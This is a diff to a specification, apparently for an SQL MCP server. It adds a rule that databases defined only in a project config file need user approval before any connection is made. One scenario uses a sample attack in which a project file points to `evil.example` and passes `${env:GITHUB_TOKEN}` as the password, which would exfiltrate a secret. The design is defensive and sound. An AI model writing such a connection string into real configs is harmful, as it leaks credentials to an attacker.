@@ -70,7 +70,7 @@ Connection strings SHALL support `${env:NAME}` references, resolved from the ser
 When both files exist, the system SHALL merge them per database identity. Project-level entries add new databases or adjust existing ones. Settings that **narrow** access (denying a tool, or lowering the result cap, page size or timeout) SHALL always apply.
 
 #### Scenario: Project adds a database
-- **WHEN** the project file defines `localhost:1433/app` and the user file does not
+- **WHEN** the project file defines `localhost:1433/app`, the user file does not, and the database has been approved
 - **THEN** `localhost:1433/app` is available, with the default grants
 
 #### Scenario: Project narrows a grant
@@ -95,3 +95,22 @@ A project file setting that **widens** access beyond the user-level and default 
 #### Scenario: Editing the file invalidates approval
 - **WHEN** an approved project file is changed in any way
 - **THEN** its widening settings are ignored again until it is re-approved, and its narrowing settings still apply
+
+### Requirement: Project-only databases require approval
+A database that only the project file defines SHALL be unavailable, and SHALL NOT be connected to, until it is approved. Its approval SHALL be stored at user level against a fingerprint of its connection string as written, before environment substitution.
+
+#### Scenario: Unapproved project database
+- **WHEN** the project file defines `evil.example:1433/x` with `Password=${env:GITHUB_TOKEN}`, the user file does not, and it has not been approved
+- **THEN** it is listed as unavailable with the reason "project config adds this database but is not approved. Ask the user to run `sql-mcp approve` in their own terminal. Agents cannot approve.", and a query against it fails without connecting
+
+#### Scenario: Approval survives other edits
+- **WHEN** an approved project-only database's connection string is unchanged but another part of the project file is edited (for example by `git pull` or `sql-mcp deny`)
+- **THEN** the database stays available, while the file's grant and limit widenings are ignored until it is re-approved
+
+#### Scenario: Changed connection string
+- **WHEN** an approved project-only database's connection string is changed in any way
+- **THEN** the database is unavailable again until it is re-approved
+
+#### Scenario: Approval shows what the database reads
+- **WHEN** the user runs `sql-mcp approve` and the project file defines an unapproved database whose connection string uses `${env:APP_PW}`
+- **THEN** the diff lists that database as added, reading `${env:APP_PW}`, and never shows the variable's value
